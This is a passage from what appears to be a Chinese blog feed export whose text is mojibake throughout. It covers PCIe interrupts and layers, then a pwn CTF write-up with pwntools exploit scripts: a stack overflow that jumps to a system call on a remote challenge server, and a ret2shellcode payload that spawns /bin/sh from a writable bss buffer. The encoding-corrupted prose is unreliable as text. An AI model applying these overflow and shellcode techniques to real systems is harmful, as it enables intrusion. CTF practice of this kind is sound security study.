¹æ®æ•°æ®å€¼è¯†åˆ«å‡ºä¸­æ–­å‘é‡ï¼Œä»è€Œè§¦å‘CPUæ‰§è¡Œç›¸åº”çš„ä¸­æ–­æœåŠ¡ç¨‹åºã€‚è¿™ç§æ–¹å¼ç›¸å½“äºç›´æ¥å†™å†…å­˜çš„æ–¹å¼æ¥è§¦å‘ä¸­æ–­ï¼Œæ¶ˆé™¤äº†ä¸­æ–­çº¿å…±äº«å†²çªçš„é—®é¢˜ã€‚</p><h2 id="ç¬¬å››é˜¶æ®µï¼šè®¾å¤‡åˆå§‹åŒ–ä¸é©±åŠ¨åŠ è½½">ç¬¬å››é˜¶æ®µï¼šè®¾å¤‡åˆå§‹åŒ–ä¸é©±åŠ¨åŠ è½½</h2><p>ä¸»æœºï¼ˆOSï¼‰æ ¹æ®è®¾å¤‡çš„ <strong>Vendor ID, Device ID, Class Code, Subsystem Vendor/Device ID</strong> ç­‰ä¿¡æ¯ï¼Œåœ¨é©±åŠ¨æ•°æ®åº“ä¸­æŸ¥æ‰¾åŒ¹é…çš„è®¾å¤‡é©±åŠ¨ç¨‹åºã€‚</p><p>æ‰¾åˆ°åŒ¹é…é©±åŠ¨åï¼ŒOSåŠ è½½è¯¥é©±åŠ¨æ¨¡å—ã€‚é©±åŠ¨è¯»å–è®¾å¤‡çš„é…ç½®ç©ºé—´ï¼Œè·å–åˆ°ä¸»æœºåˆ†é…å¥½çš„<strong>BARåŸºåœ°å€</strong>ã€‚é©±åŠ¨ä½¿ç”¨è¿™äº›åŸºåœ°å€ï¼Œé€šè¿‡<strong>Memory Mapped I/O (MMIO)</strong>ï¼ˆè®¿é—®å†…å­˜BARï¼‰æˆ– <strong>Port I/O (PIO)</strong>ï¼ˆè®¿é—®IO BARï¼Œè¾ƒå°‘ç”¨ï¼‰çš„æ–¹å¼ï¼Œè®¿é—®è®¾å¤‡çš„å¯„å­˜å™¨ï¼Œè¿›è¡Œè¿›ä¸€æ­¥çš„åˆå§‹åŒ–ã€é‡ç½®ã€å‚æ•°é…ç½®ç­‰ã€‚</p><h2 id="ç¬¬äº”é˜¶æ®µï¼šæ­£å¸¸é€šä¿¡">ç¬¬äº”é˜¶æ®µï¼šæ­£å¸¸é€šä¿¡</h2><p>ä¸»æœºCPU/å…¶ä»–è®¾å¤‡å¯ä»¥é€šè¿‡ <strong>Memory Write TLP</strong> å‘è®¾å¤‡çš„å†…å­˜æ˜ å°„å¯„å­˜å™¨ï¼ˆç”±BARå®šä¹‰ï¼‰å†™å…¥æ§åˆ¶å‘½ä»¤æˆ–æ•°æ®ï¼Œé€šè¿‡ <strong>Memory Read TLP</strong> è¯»å–è®¾å¤‡çš„å†…å­˜æ˜ å°„å¯„å­˜å™¨æˆ–æ•°æ®ç¼“å†²åŒºã€‚</p><p>è®¾å¤‡å¯ä»¥é€šè¿‡ <strong>Memory Write TLP</strong> å‘ä¸»æœºå†…å­˜å†™å…¥æ•°æ®ï¼ˆä¾‹å¦‚ï¼Œç½‘å¡æ”¶åˆ°æ•°æ®åŒ…DMAåˆ°å†…å­˜ï¼Œæ˜¾å¡å®Œæˆæ¸²æŸ“å¸§DMAåˆ°å¸§ç¼“å†²åŒºï¼‰ï¼Œé€šè¿‡ <strong>Memory Read TLP</strong> è¯»å–ä¸»æœºå†…å­˜ã€‚</p><h1 id="ä¸»æœºä¸Šç”µå¯åŠ¨ç®€æ˜“æµç¨‹">ä¸»æœºä¸Šç”µå¯åŠ¨ç®€æ˜“æµç¨‹</h1><h2 id="x86">x86</h2><figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs autohotkey">`ä¸Šç”µ` â†’ `CPUå¯åŠ¨ï¼ˆå›ºåŒ–BootROMï¼‰` â†’ `BIOS/UEFI` â†’ `Bootloaderï¼ˆå¦‚GRUBï¼‰` â†’ `OS Kernel` â†’ `Init`<br></code></pre></td></tr></table></figure><h1 id="SoCï¼ˆARMç­‰ï¼‰">SoCï¼ˆARMç­‰ï¼‰</h1><figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs autohotkey">`ä¸Šç”µ` â†’ `BootROM` â†’ `BL1/BL2`ï¼ˆBootloader åˆ†çº§ï¼‰â†’ `UEFI / TrustZone` â†’ `OS Kernel`<br></code></pre></td></tr></table></figure><h1 id="PCIä¸­æ–­æœºåˆ¶ğŸ•Šï¸">PCIä¸­æ–­æœºåˆ¶ğŸ•Šï¸</h1><p>PCI è®¾å¤‡æœ‰ä¸¤ç§æ‰“ä¸­æ–­çš„æ–¹æ³•ï¼šä¼ ç»Ÿçš„ INTx ä¸­æ–­ä¸ MSI ä¸­æ–­ï¼Œå‡ºäºå…¼å®¹çš„éœ€è¦ PCIe å®Œå…¨ç»§æ‰¿äº†è¿™ä¸ªç‰¹æ€§</p><h2 id="INTxä¸­æ–­">INTxä¸­æ–­</h2><p>INTx ç±»å‹çš„ä¸­æ–­å³ä¼ ç»Ÿçš„<strong>é€šè¿‡ä¸­æ–­å¼•è„šæ¥äº§ç”Ÿçš„ä¸­æ–­</strong>ï¼ŒPCI æ€»çº¿ä½¿ç”¨ <code>INTA#</code> ã€<code>INTB#</code> ã€<code>INTC#</code> ã€<code>INTD#</code> ä¿¡å·ï¼ˆä½ç”µå¹³æœ‰æ•ˆï¼‰å‘å¤„ç†å™¨å‘å‡ºä¸­æ–­è¯·æ±‚ï¼Œä¸è¿‡å¤šæ•°è®¾å¤‡ä»…ä½¿ç”¨ <code>INTA#</code> ä¿¡å·</p><p>ä¸‹å›¾ä¸ºä¸€ä¸ªäº§ç”Ÿ <code>INTA#</code> ä¸­æ–­ä¿¡å·çš„æµç¨‹ï¼š</p><ul><li>è®¾å¤‡å‘å—æ¡¥ä¸Šçš„ä¸­æ–­æ§åˆ¶å™¨æ‰“ä¸€ä¸ª <code>INTA#</code> ï¼Œä¸­æ–­æ§åˆ¶å™¨è½¬ä¸º <code>INTR</code> ä¿¡å·åé€šè¿‡ APIC bus æ‰“å‘å¤„ç†å™¨</li><li>æ¥å—ä¸­æ–­ä¿¡å·çš„å¤„ç†å™¨ï¼ˆæœªè®¾ç½®åˆ™é»˜è®¤éƒ½æ‰“åˆ° CPU0ï¼‰é€šè¿‡ä¸­æ–­å‘é‡è¡¨æ‰§è¡Œå¯¹åº”çš„å¤„ç†ç¨‹åº</li></ul><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/image-20250729151921563.png" alt="image-20250729151921563"></p><p>åœ¨ PCI æ€»çº¿ä¸­ï¼Œè®¾å¤‡çš„ <code>INTx å¼•è„š</code>æœ€ç»ˆè¦è¿æ¥åˆ°ä¸­æ–­æ§åˆ¶å™¨çš„ <code>IRQ å¼•è„š</code> ï¼Œä¸‹å›¾æ˜¯ä¸€ä¸ªä¸‰ PCI æ’æ§½ä¸ä¸­æ–­æ§åˆ¶å™¨å¼•è„šè¿›è¡Œè¿æ¥çš„ä¾‹å­ï¼š</p><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/image-20250729152233839.png" alt="image-20250729152233839"></p><p>è¿˜è®°å¾—æˆ‘ä»¬å‰æ–‡æ‰€è®²çš„ PCI é…ç½®ç©ºé—´ä¸­çš„ <code>Interrupt Pin</code> ä¸ <code>Interrupt Line</code> åŸŸå—ï¼Ÿç°åœ¨æˆ‘ä»¬å¯ä»¥è¿›ä¸€æ­¥æ˜ç¡®å…¶å…·ä½“ç”¨é€”äº†ï¼š</p><ul><li><code>Interrupt Pin</code>ï¼šè®°å½•è®¾å¤‡åº”è¯¥ä½¿ç”¨å“ªä¸€ä¸ª INTx ä¸­æ–­ä¿¡å·</li><li><code>Interrupt Line</code>ï¼šè®°å½•è®¾å¤‡è¿æ¥çš„å¼•è„š</li></ul><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/image-20250729152254895.png" alt="image-20250729152254895"></p><h2 id="MSI-MSI-X-ä¸­æ–­">MSI/MSI-X ä¸­æ–­</h2><p><strong>Message Signaled Interrupt</strong> æ˜¯ä¸€ç§æ›´ä¸ºç°ä»£åŒ–ä¸æ™®éçš„ PCI ä¸­æ–­æœºåˆ¶ï¼Œ<strong>MSI-eXtend</strong> åˆ™ä¸ºå…¶å‡çº§ç‰ˆï¼Œè¯¥æœºåˆ¶çš„å¼•å…¥æ˜¯ä¸ºäº†æ¶ˆé™¤ INTx çš„è¾¹å¸¦ä¿¡å·ï¼Œç›®å‰ç»å¤§å¤šæ•° PCIe è®¾å¤‡å·²ä¸å†ä½¿ç”¨ä¼ ç»Ÿçš„ INTx ä¸­æ–­ï¼Œè€Œæ˜¯ä½¿ç”¨ MSI/MSI-X æäº¤ä¸­æ–­è¯·æ±‚</p><p>åœ¨ PCIe è®¾å¤‡ä¸­æœ‰ç€ä¸¤ä¸ª Capability ç»“æ„ï¼Œåˆ†åˆ«å¯¹åº” MSI ä¸ MSI-Xï¼Œé€šå¸¸ä¸€ä¸ª PCIe è®¾å¤‡ä»…ä¼šåŒ…å«å…¶ä¸­ä¸€ä¸ªã€‚å¯¹äº MSI è€Œè¨€å…¶ Capability ID ä¸º 5ï¼Œä¸€å…±æœ‰å››ç§ç»“æ„ï¼Œåˆ†åˆ«å¯¹åº” 32 ä½ä¸ 64 ä½çš„ Message ç»“æ„ï¼Œä»¥åŠå¯¹åº”çš„å¸¦ä¸Šä¸­æ–­ Masking çš„ç»“æ„</p><p>MSI/MSI-X æœ¬è´¨ä¸Šæ˜¯é€šè¿‡<strong>å‘ç‰¹å®šçš„å†…å­˜åŒºåŸŸè¿›è¡Œå†™å…¥</strong>æ¥è¾¾åˆ°ä¸­æ–­è§¦å‘çš„æ•ˆæœï¼Œå½“ PCI è®¾å¤‡æäº¤è¯·æ±‚æ—¶ï¼Œå…¶å‘ <code>MSI/MSI-x Capability</code> ç»“æ„ä¸­çš„ <code>Message Address</code> åœ°å€ï¼ˆPCIæ€»çº¿åŸŸï¼‰å†™å…¥ <code>Message Data</code> æ•°æ®ï¼Œä»è€Œäº§ç”Ÿä¸€ä¸ªå­˜å‚¨å™¨å†™ TLPï¼Œç”±æ­¤å‘å¤„ç†å™¨æäº¤å­˜å‚¨å™¨å†™è¯·æ±‚</p><p>MSI ä»…æ”¯æŒ 32 ä¸ªè¿ç»­çš„ä¸­æ–­å‘é‡ï¼Œè€Œ MSI-X æ”¯æŒ 2048 ä¸ªéè¿ç»­çš„ä¸­æ–­å‘é‡ï¼Œä½† MSI-X çš„ä¸­æ–­å‘é‡ä¿¡æ¯å¹¶ä¸åƒ MSI é‚£æ ·ç›´æ¥å­˜æ”¾åœ¨é…ç½®ç©ºé—´ï¼Œè€Œæ˜¯å­˜æ”¾åœ¨ MMIO ç©ºé—´ä¸­ï¼Œé€šè¿‡BIRï¼ˆBase address Indicator Registerï¼‰ä¸ BAR æ¥ç¡®å®šå…¶åœ¨ MMIO ä¸­çš„å…·ä½“ä½ç½®</p><p>å…¶ç»“æ„å¦‚ä¸‹å›¾æ‰€ç¤ºï¼š</p><h1 id="PCIEåè®®çš„åˆ†å±‚ç»“æ„â€‹â€‹">PCIEåè®®çš„åˆ†å±‚ç»“æ„â€‹â€‹</h1><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/image-20250710201210154.png" alt="image-20250710201210154"></p><p>PCIe è®¾å¤‡å†…éƒ¨å±‚æ¬¡åŒ…æ‹¬ï¼š</p><ul><li><strong>è®¾å¤‡æ ¸å¿ƒå±‚ä»¥åŠå®ƒä¸äº‹åŠ¡å±‚çš„æ¥å£</strong>ã€‚è®¾å¤‡æ ¸å¿ƒå±‚å®ç°è®¾å¤‡çš„ä¸»è¦åŠŸèƒ½ã€‚å¦‚æœè®¾å¤‡æ˜¯ä¸€ä¸ªç«¯ç‚¹ï¼Œé‚£ä¹ˆå®ƒæœ€å¤šå¯ä»¥åŒ…å« 8 ä¸ªåŠŸèƒ½ï¼ˆfunctionï¼‰ï¼Œæ¯ä¸ªåŠŸèƒ½å®ç°è‡ªå·±çš„é…ç½®ç©ºé—´ã€‚å¦‚æœè®¾å¤‡æ˜¯ä¸€ä¸ªäº¤æ¢æœºï¼Œé‚£ä¹ˆå®ƒçš„æ ¸å¿ƒç”±æ•°æ®åŒ…è·¯ç”±é€»è¾‘å’Œä¸ºäº†å®ç°è·¯ç”±çš„å†…éƒ¨æ€»çº¿æ„æˆã€‚å¦‚æœè®¾å¤‡æ˜¯ä¸€ä¸ª RCï¼Œé‚£ä¹ˆå…¶æ ¸å¿ƒä¼šå®ç°ä¸€ä¸ªè™šæ‹Ÿçš„ PCI æ€»çº¿ 0ï¼Œåœ¨è¿™ä¸ªè™šæ‹Ÿçš„ PCI æ€»çº¿ 0ä¸­å­˜åœ¨ç€æ‰€æœ‰çš„èŠ¯ç‰‡ç»„åµŒå…¥å¼ç«¯ç‚¹ä»¥åŠè™šæ‹Ÿæ¡¥ã€‚</li><li><strong>äº‹åŠ¡å±‚</strong>ã€‚äº‹åŠ¡å±‚è´Ÿè´£åœ¨å‘é€ç«¯äº§ç”Ÿ TLPï¼ˆTransaction Layer Packetï¼Œäº‹åŠ¡å±‚åŒ…ï¼‰ï¼Œåœ¨æ¥æ”¶ç«¯å¯¹ TLP è¿›è¡Œè¯‘ç ï¼Œç”¨æˆ·å¯¹æ•°æ®è¿›è¡Œç»„å¸§å’Œè§£ææ˜¯åœ¨æœ¬å±‚è¿›è¡Œã€‚è¿™ä¸€å±‚ä¹Ÿè´Ÿè´£ QoSï¼ˆQuality of Serviceï¼ŒæœåŠ¡è´¨é‡ï¼‰ã€æµé‡æ§åˆ¶ä»¥åŠäº‹åŠ¡æ’åºã€‚</li><li><strong>æ•°æ®é“¾è·¯å±‚</strong>ã€‚æ•°æ®é“¾è·¯å±‚è´Ÿè´£åœ¨å‘é€ç«¯äº§ç”Ÿ DLLPï¼ˆData Link Layer Packetï¼Œæ•°æ®é“¾è·¯å±‚åŒ…ï¼‰ï¼Œåœ¨æ¥æ”¶ç«¯å¯¹ DLLP è¿›è¡Œè¯‘ç ã€‚è¿™ä¸€å±‚ä¹Ÿè´Ÿè´£é“¾è·¯é”™è¯¯æ£€æµ‹ä»¥åŠä¿®æ­£ï¼Œè¿™ä¸ªæ•°æ®é“¾è·¯å±‚åŠŸèƒ½è¢«ç§°ä¸º Ack/Nak åè®®ã€‚è¿™ä¸¤ä¸ªæ•°æ®é“¾è·¯å±‚åŠŸèƒ½ä¼šåœ¨æœ¬ä¹¦çš„ç¬¬ä¸‰éƒ¨åˆ†è¿›è¡Œè®²è§£ã€‚</li><li><strong>ç‰©ç†å±‚</strong>ã€‚ç‰©ç†å±‚è´Ÿè´£åœ¨å‘é€ç«¯äº§ç”Ÿå­—ç¬¦åºåˆ—åŒ…ï¼Œåœ¨æ¥æ”¶ç«¯å¯¹å­—ç¬¦åºåˆ—åŒ…è¿›è¡Œè¯‘ç ã€‚è¿™ä¸€å±‚å°†å¤„ç†ä¸Šè¿°ä¸‰ç§ç±»å‹çš„åŒ…ï¼ˆTLPã€DLLPã€å­—ç¬¦åºåˆ—åŒ…ï¼‰åœ¨ç‰©ç†é“¾è·¯ä¸Šçš„å‘é€ä¸æ¥æ”¶ã€‚æ•°æ®åŒ…åœ¨å‘é€ç«¯è¦ç»è¿‡å­—èŠ‚æ¡å¸¦åŒ–é€»è¾‘ã€æ‰°ç å™¨ã€8b/10b ç¼–ç å™¨ï¼ˆå¯¹äº Gen1/Gen2ï¼‰æˆ–æ˜¯ 128b/130b ç¼–ç å™¨ï¼ˆå¯¹äº Gen3ï¼‰ä»¥åŠæ•°æ®åŒ…å¹¶ä¸²è½¬æ¢æ¨¡å—çš„å¤„ç†ã€‚æœ€ç»ˆæ•°æ®åŒ…ä»¥è®­ç»ƒåçš„é“¾è·¯é€Ÿç‡åœ¨æ‰€æœ‰é€šé“ä¸ŠæŒ‰ç…§æ—¶é’Ÿä»¥å·®åˆ†å½¢å¼è¾“å‡ºã€‚åœ¨ç‰©ç†å±‚çš„æ¥æ”¶ç«¯ï¼Œæ•°æ®åŒ…å¤„ç†åŒ…æ‹¬ä¸²è¡Œåœ°æ¥æ”¶å·®åˆ†å½¢å¼çš„æ¯”ç‰¹ä¿¡å·ï¼Œå°†å…¶è½¬æ¢ä¸ºæ•°å­—ä¿¡å·å½¢å¼ï¼Œç„¶åå°†è¾“å…¥æ¯”ç‰¹æµåšä¸²å¹¶è½¬æ¢ã€‚è¿™ä¸ªæ“ä½œåŸºäºæ¥æºäº CDRï¼ˆClock and Data Recoveryï¼Œæ—¶é’Ÿæ•°æ®æ¢å¤ï¼‰ç”µè·¯æ‰€æä¾›çš„æ¢å¤æ—¶é’Ÿã€‚æ¥æ”¶ä¸‹æ¥çš„æ•°æ®åŒ…è¦ç»è¿‡å¼¹æ€§ç¼“å­˜ã€8b/10b è§£ç å™¨ï¼ˆå¯¹äº Gen1/Gen2ï¼‰æˆ–è€… 128b/130b è§£ç å™¨ï¼ˆå¯¹äº Gen3ï¼‰ã€è§£æ‰°å™¨ä»¥åŠå­—èŠ‚äº¤æ¢æ¢å¤é€»è¾‘ã€‚æœ€ç»ˆï¼Œç‰©ç†å±‚çš„ LTSSMï¼ˆLink Training and Status State Machineï¼Œé“¾è·¯è®­ç»ƒçŠ¶æ€æœºï¼‰è´Ÿè´£è¿›è¡Œé“¾è·¯åˆå§‹åŒ–ä»¥åŠè®­ç»ƒã€‚</li></ul>]]></content>
    
    
    
    <tags>
      
      <tag>PCIe</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>pwnåšé¢˜è®°å½•</title>
    <link href="/2025/05/14/pwn%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/"/>
    <url>/2025/05/14/pwn%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/</url>
    
    <content type="html"><![CDATA[<h1 id="00-å¼€å§‹ä¹‹å‰">00 å¼€å§‹ä¹‹å‰</h1><p>å› ä¸ºç ”ç©¶ç”Ÿåšçš„æ–¹å‘å’Œå†…æ ¸ç›¸å…³ï¼Œæ„Ÿè§‰pwné‡Œé¢å¾ˆå¤šæŠ€å·§éƒ½æ˜¯è¿ç”¨å†…æ ¸çš„æ¼æ´çš„ï¼Œæ‰€ä»¥å­¦ä¹ ä¸€ä¸‹pwnå¹¶åšä¸€ä¸‹è®°å½•ã€‚å¦ä¸€ä¸ªä¸»è¦åŸå› å°±æ˜¯è§‰å¾—pwnçœŸçš„éå¸¸å®ç”¨<s>éå¸¸å¸…</s></p><h1 id="01-ciscn-2019-n-1">01 ciscn_2019_n_1</h1><p>è¿™é“é¢˜ç›®æ˜¯ä¸€é“ç®€å•çš„æ ˆæº¢å‡ºé¢˜ç›®ï¼Œå…ˆæŸ¥çœ‹ä¸€ä¸‹ä¿æŠ¤æªæ–½ï¼Œå‘ç°å¼€å¯æ ˆä¸å¯æ‰§è¡Œä¿æŠ¤ã€‚</p><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/image-20250514144722687.png" alt="image-20250514144722687"></p><p>æ¥ä¸‹æ¥åˆ°idaæŸ¥çœ‹ä¸€ä¸‹å‡½æ•°ä¸»ä½“éƒ¨åˆ†ï¼Œå‘ç°å‡½æ•°é€»è¾‘å¾ˆç®€å•ï¼Œå¹¶ä¸”å­˜åœ¨getså‡½æ•°ï¼Œæ˜¯ä¸ªæ˜æ˜¾çš„æ ˆæº¢å‡ºæ¼æ´ã€‚å…¶ä¸­<code>v1</code> æ˜¯ <code>char[44]</code> çš„ç¼“å†²åŒºï¼Œä½† <code>gets()</code> å¯è¾“å…¥æ— é™é•¿åº¦æ•°æ®ï¼Œå¯¼è‡´æ ˆæº¢å‡ºã€‚</p><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/image-20250514144912449.png" alt="image-20250514144912449"></p><p>è™½ç„¶å¼€å¯äº†æ ˆä¸å¯æ‰§è¡Œä¿æŠ¤ï¼Œä½†æ˜¯å‡½æ•°ä¸­æœ¬èº«å­˜åœ¨<code>cat /flag</code>é€»è¾‘ï¼Œæ— éœ€åœ¨æ ˆä¸­æ‰§è¡Œç¨‹åºï¼Œå› æ­¤è¿™é‡Œå¯ä»¥é€‰æ‹©è¦†ç›–v2çš„å€¼ï¼Œä¹Ÿå¯ä»¥é€‰æ‹©ç›´æ¥è·³è½¬åˆ°systemå‡½æ•°æ‰§è¡Œã€‚</p><p>è¿™é‡Œç¬”è€…é€‰æ‹©ç›´æ¥è·³è½¬æ‰§è¡Œsystemå‡½æ•°æŸ¥çœ‹ä»£ç å †æ ˆå†…å®¹ï¼Œå¯ä»¥çœ‹åˆ°å †æ ˆä¸­retè·ç¦»v1æœ‰0x30+8ä¸ªå­—èŠ‚ï¼Œå› æ­¤ç›´æ¥å¡«å……0x38ä¸ªå­—ç¬¦å³å¯ã€‚</p><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/image-20250514145746072.png" alt="image-20250514145746072"></p><p>æ¥ä¸‹æ¥æ„é€ POCï¼Œå…¶ä¸­systemçš„åœ°å€æŸ¥çœ‹åä¸º0x4006BEã€‚POCå¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>r=remote(<span class="hljs-string">&quot;node5.buuoj.cn&quot;</span>,<span class="hljs-number">25764</span>)<br><br>p1=<span class="hljs-string">b&#x27;a&#x27;</span>*(<span class="hljs-number">0x30</span>+<span class="hljs-number">8</span>)+p64(<span class="hljs-number">0x4006BE</span>)<br><br>r.sendline(p1)<br><br>r.interactive()<br></code></pre></td></tr></table></figure><h1 id="02-ret2shellcode">02 ret2shellcode</h1><p>å…ˆçœ‹ä¸€ä¸‹ç¨‹åºåŸºæœ¬ä¿¡æ¯ï¼Œå‘ç°åŸºæœ¬ä¸Šæ²¡æœ‰å¼€å¯ä»€ä¹ˆä¿æŠ¤æªæ–½ï¼Œå¹¶ä¸”RWXæ®µè¿˜è¡¨ç¤ºç¨‹åºä¸­å­˜åœ¨å¯è¯»ã€å¯å†™ã€å¯æ‰§è¡Œçš„ä»£ç æ®µã€‚</p><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/image-20250515130444924.png" alt="image-20250515130444924"></p><p>æ¥ä¸‹æ¥çœ‹ä¸€ä¸‹å‡½æ•°ä¸»ä½“ï¼Œgetså±é™©å‡½æ•°ï¼Œå­˜åœ¨æ ˆæº¢å‡ºã€‚ä½†æ˜¯å‘ç°ä¸å­˜åœ¨systemå‡½æ•°ï¼Œé‚£å°±ä¸èƒ½ç›´æ¥ä½¿ç”¨ç°æœ‰å‡½æ•°ï¼Œè€ƒè™‘æˆ‘ä»¬è‡ªå·±å†™å…¥shellcodeæˆ–è€…æ˜¯é€šè¿‡ROPæ¥æ‰§è¡Œshellcodeã€‚</p><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/image-20250515130530096.png" alt="image-20250515130530096"></p><p>è¿™é“é¢˜å·²ç»æç¤ºçš„å¾ˆæ˜æ˜¾äº†ï¼Œå¹¶ä¸”RWXè¿˜å«æœ‰å¯è¯»å†™æ‰§è¡Œçš„æ®µï¼Œé‚£å¤§æ¦‚ç‡æ˜¯æˆ‘ä»¬è‡ªå·±å†™å…¥shellcodeã€‚ä¸è¿‡è¿™é‡Œè¿˜æ˜¯æŸ¥çœ‹ä¸€ä¸‹ã€‚åœ¨gdbä¸­ä½¿ç”¨vmmapæŸ¥çœ‹æ®µçš„æƒé™ã€‚</p><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/image-20250515142803027.png" alt="image-20250515142803027"></p><p>æ­¤å¤„vmmapåªç»™æˆ‘ä»¬æä¾›äº†3ç±»ä¿¡æ¯ï¼ˆå¯ä»¥æ ¹æ®é¢œè‰²åˆ¤æ–­ï¼‰ï¼šCODEã€RODATAä»¥åŠSTACKã€‚ä¹ä¸€çœ‹è¿™é¢˜å¥½åƒå¯ä»¥å°†shellcodeæ³¨å…¥è‡³stackä¸­ï¼Œä½†ç»å¤§å¤šæ•°çš„æ“ä½œç³»ç»Ÿéƒ½é»˜è®¤å¼€å¯ASLRä¿æŠ¤ï¼Œè¿™å¤§å¤§æé«˜äº†æ”»å‡»æ ˆçš„éš¾åº¦ã€‚å› æ­¤ï¼Œæ ˆåº”å½“æ˜¯æˆ‘ä»¬æœ€åè€ƒè™‘çš„å¯¹è±¡ã€‚</p><p>éšåæˆ‘ä»¬çœ‹åˆ°æœ‰ä¸ªbuf2çš„å˜é‡æ²¡æœ‰è¢«å®šä¹‰ï¼ŒæŸ¥çœ‹ä¸€ä¸‹å‘ç°æ˜¯ä¸ªå…¨å±€å˜é‡åœ¨bssæ®µï¼Œåœ°å€ä¸º<code>0804A080</code>ï¼Œå†çœ‹ä¸€ä¸‹vmmapçš„ç»“æœï¼Œ0x804a000-0x804b000æ˜¯ä¸€ä¸ªå¯æ‰§è¡Œçš„æ®µã€‚</p><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/image-20250515143954449.png" alt="image-20250515143954449"></p><p>é‚£æˆ‘ä»¬çš„æ€è·¯å°±å¾ˆæ¸…æ™°äº†ï¼Œå°±æ˜¯å°†shellcodeå†™å…¥åˆ°buf2ä¹‹åå†å¡«å……åƒåœ¾æ•°æ®è¦†ç›–æ ˆï¼Œæœ€åå°†æ ˆè¿”å›åœ°å€æŒ‡å‘buf2çš„èµ·å§‹åœ°å€å³å¯ã€‚</p><p>ä¸‹é¢å°±æ˜¯æˆ‘ä»¬å¦‚ä½•æ„é€  payload äº†ï¼Œé¦–å…ˆéœ€è¦ç¡®å®šçš„æ˜¯æˆ‘ä»¬èƒ½å¤Ÿæ§åˆ¶çš„å†…å­˜çš„èµ·å§‹åœ°å€è·ç¦» main å‡½æ•°çš„è¿”å›åœ°å€çš„å­—èŠ‚æ•°ã€‚</p><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/image-20250516094545297.png" alt="image-20250516094545297"></p><p>å¯ä»¥çœ‹åˆ°è¯¥å­—ç¬¦ä¸²æ˜¯é€šè¿‡ç›¸å¯¹äºespçš„ç´¢å¼•ï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦è¿›è¡Œè°ƒè¯•ï¼ˆè‡³äºä¸ºä»€ä¹ˆä¹‹å‰æœ‰äº›é¢˜ç›®ä¹Ÿæ˜¯espå´å¯ä»¥ç›´æ¥æŸ¥çœ‹Stack of mainï¼Œæˆ‘ä¹Ÿä¸çŸ¥é“ï¼Œåªèƒ½ä¹‹ååšé¢˜çš„æ—¶å€™éƒ½å°½é‡è°ƒè¯•ä¸€ä¸‹ï¼‰ï¼Œå°†æ–­ç‚¹ä¸‹åœ¨ call å¤„ï¼ŒæŸ¥çœ‹ espï¼Œebpã€‚</p><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/image-20250516101708983.png" alt="image-20250516101708983"></p><p>å¯ä»¥çœ‹åˆ°è¿™æ—¶å€™çš„sçš„åœ°å€ä¸º0xffffd53cï¼Œè€Œebpä¸º0xffffd5a8ï¼Œè®¡ç®—å¾—åˆ°sç›¸å¯¹äºebpçš„åç§»ä¸º6cã€‚æ„é€ payloadå¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>r=process(<span class="hljs-string">&#x27;./ret2shellcode&#x27;</span>)<br><br>shellcode = asm(shellcraft.sh())<br><br>buf2_addr=<span class="hljs-number">0x0804A080</span><br><br>padding=<span class="hljs-number">0x6c</span>+<span class="hljs-number">4</span><br><br>p1=shellcode.ljust(padding,<span class="hljs-string">b&#x27;a&#x27;</span>)+p32(buf2_addr)<br><br>r.sendline(p1)<br><br>r.interactive()<br></code></pre></td></tr></table></figure><p><code>shellcraft.sh()</code>æ˜¯pwntools çš„<strong>Shellcraft æ¨¡å—</strong>ï¼Œå®ƒç”Ÿæˆä¸€ä¸ª <strong>spawn /bin/sh çš„æ±‡ç¼–æ¨¡æ¿</strong>ã€‚asm()å‡½æ•°ä¼šæŠŠ æ±‡ç¼–æ¨¡æ¿ç¼–è¯‘æˆæœºå™¨ç bytesï¼Œä¹Ÿå°±æ˜¯shellcodeå¯ä»¥ç›´æ¥å†™å…¥å†…å­˜æ‰§è¡Œã€‚</p><p>æˆåŠŸåˆ©ç”¨æ¼æ´ï¼š</p><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/image-20250518160853607.png" alt="image-20250518160853607"></p><h1 id="03-gdb">03 gdb</h1><p>è¿™é‡Œæˆ‘ä»¬å†è¡¥å……ä¸€ä¸‹gdbçš„ä½¿ç”¨æ–¹æ³•ã€‚</p><p>è¿è¡Œä¸€èˆ¬ç¨‹åºï¼š<code>gdb æ–‡ä»¶</code></p><h2 id="3-1-æ‰“æ–­ç‚¹">3.1 